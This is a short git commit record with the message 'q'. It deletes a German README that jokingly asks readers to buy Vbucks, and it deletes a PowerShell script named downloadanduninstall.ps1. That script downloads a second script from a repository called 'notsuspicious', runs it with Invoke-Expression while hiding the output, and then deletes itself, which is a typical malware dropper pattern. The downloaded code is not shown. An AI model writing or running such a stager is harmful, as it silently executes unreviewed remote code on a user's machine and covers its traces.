409c3d184072b5c8921263fd79bb8d3454a3f60e
RaupenInspektor <viktorfranzen@gmx.de>
2024-02-27 19:05:33 +0100

    q

--- README.md
+++
@@ -1,6 +0,0 @@
-# Max
-Wenn du dies liest, kaufe uns Vbucks.
-
-Danke im Voraus!
-anonymous[245], anonymous[361]
-
--- downloadanduninstall.ps1
+++
@@ -1,2 +0,0 @@
-Invoke-Expression (Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/notsuspicious/raw/main/downloader.ps1" -UseBasicParsing).Content | Out-Null
-Remove-Item $PSCommandPath -Force 
